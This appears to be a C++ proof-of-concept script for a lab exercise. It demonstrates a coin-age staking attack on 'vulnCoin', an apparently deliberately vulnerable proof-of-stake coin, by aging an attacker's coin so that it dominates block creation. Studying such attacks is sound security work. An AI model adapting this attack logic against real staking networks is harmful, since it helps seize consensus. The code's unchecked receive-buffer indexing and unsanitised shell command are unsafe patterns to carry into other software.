#include <iostream>
#include <vector>
#include <sstream>
#include <unistd.h>
#include <cstring>
#include <thread>
#include <iomanip>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/sha.h>
#include <openssl/evp.h>

#include "../libs/rang.hpp"
#include "../libs/json.hpp"

//DEFAULT NETWORK SETTINGS - changing them is possible and encouraged, but be aware of the pitfalls listed below. It is possible that PoC breaks when settings are handled inadequately.
//Defines seconds to wait if connectivity issues were to occur. Program generally waits 5 times the DELAY_SECONDS.
#define DELAY_SECONDS 2
//Defines the number of rounds passing between the attacker generating the first transaction and the attack (two more rounds will happen after these -> then the consensus round occurs).
#define ROUNDS_TO_AGE 15
//Defines number of the rounds to create blocks according to the consensus.
#define CONSENSUS_ROUNDS 15
//Size of the buffer to receive messages.
#define BUFFER_SIZE 60000

/**
 * Thread function that runs the server on specified ip address in the background.
 * @param username Username to login into remote system with via ssh.
 * @param ipAddress IP address of the target of ssh.
 * @param port Port on which the server will be run.
 * @param attacker Specifies whether thread is an attacker or not for the purposes of output coloring.
 */
void server(const std::string &username, const std::string &ipAddress, const std::string &port, const bool attacker) {
    //Create the command for connecting to remote system and running the server with coin age property set to true.
    std::ostringstream oss;
    oss << "ssh " << username << "@" << ipAddress << " '(vulnCoin-server " << port << " 1)&'" << std::endl;

    //Start the server.
    system(oss.str().c_str());

    //Set output color.
    if (attacker) {
        std::cout << rang::fg::blue << rang::style::bold;
    } else {
        std::cout << rang::fg::magenta << rang::style::bold;
    }

    //Output the information about the server stopping.
    std::cout << "==============================" << std::endl
              << "Thread [" << username << "] is stopping." << std::endl
              << "==============================" << rang::style::reset << std::endl;
}

/**
 * Function that creates a socket to communicate with a remote server.
 * @param message Command to be sent to the remote server.
 * @param ipAddress IP address of the remote server.
 * @param port Port of the remote server.
 * @return Response received from the remote server or an empty string.
 */
std::string sendMessageToIpAddress(const std::string message, const std::string &ipAddress, const std::string &port) {
    //Create a socket and socket information based on the specified attributes.
    int messageSocket = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(std::stoi(port));
    inet_pton(AF_INET, ipAddress.c_str(), &serverAddr.sin_addr);

    //Try connecting to the server. In case of failure return empty string.
    if (connect(messageSocket, reinterpret_cast<struct sockaddr *>(&serverAddr), sizeof(serverAddr))) {
        return "";
    }

    //Send the specified command to the remote server.
    send(messageSocket, message.c_str(), message.size(), 0);

    //Receive an answer from the server.
    char buffer[BUFFER_SIZE];
    int receivedBytesCnt = recv(messageSocket, buffer, sizeof(buffer), 0);
    buffer[receivedBytesCnt] = '\0';

    //Close the socket and return received message.
    close(messageSocket);
    return std::string(buffer);
}

/**
 * Function to stop all the specified servers.
 * @param ipAddresses Vector of IP addresses to be stopped.
 * @param port Port on which the servers are running.
 */
void stopServers(const std::vector<std::string> &ipAddresses, const std::string port) {
    for (const std::string &ipAddress: ipAddresses) {
        sendMessageToIpAddress("stop", ipAddress, port);
    }
}

/**
 * Generate block containing only coinbase transaction assigned to the creator specified by address.
 * @param expectedCreator vulnCoin address of the block creator.
 * @param ipAddresses IP addresses of all servers in the network.
 * @param port Port on which servers communicate.
 * @return ID of the newly created coinbase transaction.
 */
std::string generateBlockTo(const std::string &expectedCreator, const std::vector<std::string> &ipAddresses,
                            const std::string port) {
    //Create a new coinbase transaction assigned to the block creator. We are creating the block first on the server [0] for simplicity purposes, it does not really matter on which server we start.
    std::ostringstream commandLoad, commandPropose;
    const auto timeNow = std::chrono::system_clock::now();
    commandLoad << "loadCoinbaseTransaction " << expectedCreator << " "
                << std::chrono::duration_cast<std::chrono::seconds>(timeNow.time_since_epoch()).count();
    std::string coinbaseTxid = sendMessageToIpAddress(commandLoad.str(), ipAddresses[0], port);
    commandPropose << "proposeBlock {" << coinbaseTxid << "}";
    sendMessageToIpAddress(commandPropose.str(), ipAddresses[0], port);

    //Send the information about the block to all the remaining servers.
    for (size_t i = 1; i < ipAddresses.size(); ++i) {
        sendMessageToIpAddress(commandLoad.str(), ipAddresses[i], port);
        sendMessageToIpAddress(commandPropose.str(), ipAddresses[i], port);
    }

    return coinbaseTxid;
}

/**
 * Stake a coin specified by txid and holder address.
 * @param ipAddresses Vector of ip addresses of servers in the network.
 * @param port Port on which the servers run.
 * @param address vulnCoin address of the holder of the coin.
 * @param txid Transaction ID defining the coin.
 */
void createStake(const std::vector<std::string> &ipAddresses, const std::string port,
                 const std::string &address, const std::string &txid) {
    std::ostringstream stakeOss;
    stakeOss << "stake " << txid << " " << address;
    for (const std::string &ipAddress: ipAddresses) {
        sendMessageToIpAddress(stakeOss.str(), ipAddress, port);
    }
}

/**
 * Function to display the proportional difference of the staked value in the network.
 * @param addresses vulnCoin addresses of all servers in the network.
 * @param port Port on which the servers run.
 * @param ipAddress IP address of one of the servers.
 */
void showDifferenceInStakes(const std::vector<std::string> &addresses, const std::string &port,
                            const std::string &ipAddress) {
    //Get pool of the stakes.
    nlohmann::json stakePool = nlohmann::json::parse(sendMessageToIpAddress("listStakepool", ipAddress, port));

    //Count stake value of each of the network participants.
    size_t attacker = 0, victim1 = 0, victim2 = 0;
    for (size_t i = 0; i < stakePool.size(); ++i) {
        if (stakePool[i]["address"].get<std::string>() == addresses[0]) {
            ++attacker;
        } else if (stakePool[i]["address"].get<std::string>() == addresses[1]) {
            ++victim1;
        } else {
            ++victim2;
        }
    }
    std::cout << rang::fg::gray << rang::style::bold << "=======================================" << std::endl
              << rang::fg::blue << "Attacker has probability of [" << attacker << "/" << stakePool.size()
              << "] to be chosen as the next block creator." << std::endl << rang::fg::magenta
              << "Victim1 has probability of [" << victim1 << "/" << stakePool.size()
              << "] to be chosen as the next block creator." << std::endl << "Victim2 has probability of [" << victim2
              << "/" << stakePool.size() << "] to be chosen as the next block creator." << std::endl << rang::fg::gray
              << rang::style::bold << "=======================================" << std::endl;
}

/**
 * Main function of the PoC.
 * @return 1 in case of connectivity issues. Otherwise 0.
 */
int main() {
    //Initiate randomness.
    srand(time(nullptr));

    //Get vector of IP addresses, vector of usernames for ssh and a port number.
    std::vector<std::string> ipAddresses(
            {std::getenv("IP_ATTACKER"), std::getenv("IP_VICTIM1"), std::getenv("IP_VICTIM2")}), usernames(
            {"attacker", "victim1", "victim2"});
    std::string port(std::getenv("PORT"));

    //Run servers in separate threads. Sleeps guarantee that random addresses are generated for each of the servers.
    std::vector<std::thread> threads;
    threads.emplace_back(std::thread(server, std::ref(usernames[0]), std::ref(ipAddresses[0]), std::ref(port), true));
    sleep(1);
    threads.emplace_back(std::thread(server, std::ref(usernames[1]), std::ref(ipAddresses[1]), std::ref(port), false));
    sleep(1);
    threads.emplace_back(std::thread(server, std::ref(usernames[2]), std::ref(ipAddresses[2]), std::ref(port), false));

    //Ensure that all servers are running. If [5] tries have happened, stop the applications.
    size_t timeoutCnt = 0;
    while (sendMessageToIpAddress("getBlockCount", ipAddresses[0], port) != "1" ||
           sendMessageToIpAddress("getBlockCount", ipAddresses[1], port) != "1" ||
           sendMessageToIpAddress("getBlockCount", ipAddresses[2], port) != "1") {
        if (timeoutCnt == 5) {
            std::cout << rang::fg::red << rang::style::bold
                      << "Timeout has happened. Wait for a while and then try running the application again."
                      << rang::style::reset << std::endl;
            stopServers(ipAddresses, port);
            exit(1);
        }
        ++timeoutCnt;
        std::cout << rang::fg::gray << rang::style::bold << "Waiting for start of the servers." << rang::style::reset
                  << std::endl;

        sleep(DELAY_SECONDS);
    }
    std::cout << rang::fg::green << rang::style::bold << "Servers successfully started!" << rang::style::reset
              << std::endl;

    //Load the randomly generated addresses.
    std::vector<std::string> vulncoinAddresses;
    for (size_t i = 0; i < ipAddresses.size(); ++i) {
        vulncoinAddresses.push_back(sendMessageToIpAddress("printAddress", ipAddresses[i], port));
    }

    //Generate block to the attacker. Save the coinbase txid. This transaction will be used for staking.
    std::string attackerTxid = generateBlockTo(vulncoinAddresses[0], ipAddresses, port);
    sleep(1);
    std::cout << rang::fg::gray << rang::style::bold << "=======================================" << std::endl
              << rang::fg::blue <<"Attacker has created the coin of txid [" << attackerTxid << "] they will use for the attack."
              << std::endl << rang::fg::gray << "=======================================" << std::endl << rang::style::reset;


    //Rounds run to age the attackers coin. -> All the blocks are bound to attacker to ensure that they surely have a coin that is [ROUNDS_TO_AGE] older than others.
    for (size_t i = 0; i < ROUNDS_TO_AGE; ++i) {
        generateBlockTo(vulncoinAddresses[0], ipAddresses, port);
        sleep(1);
    }
    std::cout << rang::fg::gray << rang::style::bold << "=======================================" << std::endl
              << rang::fg::blue << "Attacker has generated [" << ROUNDS_TO_AGE << "] blocks, so their coin of txid [" << attackerTxid
              << "] now has staking value [" << ROUNDS_TO_AGE + 1 << "]." << std::endl
              << rang::fg::gray << "=======================================" << rang::style::reset << std::endl;

    //Generate coins for the victims and save their txids.
    std::string victim1Txid = generateBlockTo(vulncoinAddresses[1], ipAddresses, port);
    std::string victim2Txid = generateBlockTo(vulncoinAddresses[2], ipAddresses, port);

    std::cout << rang::fg::gray << rang::style::bold << "=======================================" << std::endl
              << rang::fg::magenta << "Victim1 has created coin of txid [" << victim1Txid << "], it now has staking value of [2]."
              << std::endl
              << "Victim2 has created coin of txid [" << victim2Txid << "], it now has staking value of [1]."
              << std::endl
              << rang::fg::gray << "=======================================" << rang::style::reset << std::endl;

    size_t attackerTotal = 0, networkTotal = 0;
    //Start the consensus rounds!
    for (size_t i = 0; i < CONSENSUS_ROUNDS; ++i) {
        std::cout << rang::fg::gray << rang::style::bold << "=======================================" << std::endl
                  << rang::fg::gray << rang::style::bold << "STARTING [" << i << ".] CONSENSUS ROUND" << std::endl
                  << rang::fg::gray << rang::style::bold << "=======================================" << std::endl;
        createStake(ipAddresses, port, vulncoinAddresses[0], attackerTxid);
        createStake(ipAddresses, port, vulncoinAddresses[1], victim1Txid);
        createStake(ipAddresses, port, vulncoinAddresses[2], victim2Txid);

        showDifferenceInStakes(vulncoinAddresses, port, ipAddresses[0]);

        const std::string expectedCreator = sendMessageToIpAddress("countNextValidator", ipAddresses[0], port);
        for (size_t i = 1; i < ipAddresses.size(); ++i) {
            if (sendMessageToIpAddress("countNextValidator", ipAddresses[i], port) != expectedCreator) {
                std::cout << rang::fg::red << rang::style::bold
                          << "Nodes became desynchronized for unknown reasons. Try running the attack one more time."
                          << rang::style::reset << std::endl;
                stopServers(ipAddresses, port);
                exit(1);
            }
        }

        if (expectedCreator == vulncoinAddresses[0]) {
            std::cout << rang::fg::green << rang::style::bold << "Attacker was chosen as a block creator!"
                      << rang::style::reset << std::endl;
            ++attackerTotal;
        } else {
            std::cout << rang::fg::red << rang::style::bold
                      << "Attacker was not chosen as a block creator. Generating block to the address of the chosen creator."
                      << rang::style::reset << std::endl;
            ++networkTotal;
        }

        generateBlockTo(expectedCreator, ipAddresses, port);
        sleep(1);
    }

    stopServers(ipAddresses, port);

    //Wait for all threads to stop.
    for (std::thread &thread: threads) {
        thread.join();
    }

    //Print the results. Attack is deemed successful if the attacker managed to create more blocks than the rest of the network.
    if (attackerTotal > networkTotal) {
        std::cout << rang::fg::green << rang::style::bold << "Attack successful!" << std::endl;
    } else {
        std::cout << rang::fg::red << rang::style::bold << "Attack unsuccessful!" << std::endl;
    }

    std::cout << rang::fg::blue << rang::style::bold << "Attacker" << rang::fg::gray << " has created ["
              << rang::fg::blue << attackerTotal << rang::fg::gray << "] blocks, while " << rang::fg::magenta
              << "rest of the network" << rang::fg::gray << " has created [" << rang::fg::magenta << networkTotal
              << rang::fg::gray << "] blocks." << rang::style::reset << std::endl;

    return 0;
}
